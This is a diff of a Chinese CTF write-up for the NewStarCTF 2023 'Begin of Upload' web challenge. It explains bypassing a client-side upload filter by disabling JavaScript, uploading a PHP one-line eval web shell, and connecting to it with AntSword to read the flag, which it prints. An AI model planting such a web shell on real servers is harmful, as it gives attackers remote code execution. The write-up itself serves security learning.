@@ -16,19 +16,20 @@
    $PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
    ```
 
-   ## WEEK1|WEB Begin of Upload
 
-   通过题目可以看到应该是利用文件上传的漏洞，在google浏览器先上传一个php文件发现有过滤，在**设置**中对js进行禁止就可以成功上传php文件，php文件内容如下：（利用一句话木马）
+## WEEK1|WEB Begin of Upload
 
-   ```php
-   <?php @eval($_POST['attack']);?>
-   ```
+通过题目可以看到应该是利用文件上传的漏洞，在google浏览器先上传一个php文件发现有过滤，在**设置**中对js进行禁止就可以成功上传php文件，php文件内容如下：（利用一句话木马）
 
-   成功将文件上传后利用蚁剑连接一句话木马成功进入服务器，在服务器的文件列表发现有f11114g文件打开得到flag
+```php
+<?php @eval($_POST['attack']);?>
+```
 
-   ```tex
-   flag{b082c1e5-526a-4dbd-a5c4-00fa035bfb3c}
-   ```
+成功将文件上传后利用蚁剑连接一句话木马成功进入服务器，在服务器的文件列表发现有f11114g文件打开得到flag
 
-   ![1](https://github.com/2aurora2/CTF-WriteUp/blob/main/NewStarCTF_2023/image/1.png)
+```tex
+flag{b082c1e5-526a-4dbd-a5c4-00fa035bfb3c}
+```
+
+![1](https://github.com/2aurora2/CTF-WriteUp/blob/main/NewStarCTF_2023/image/1.png)
 
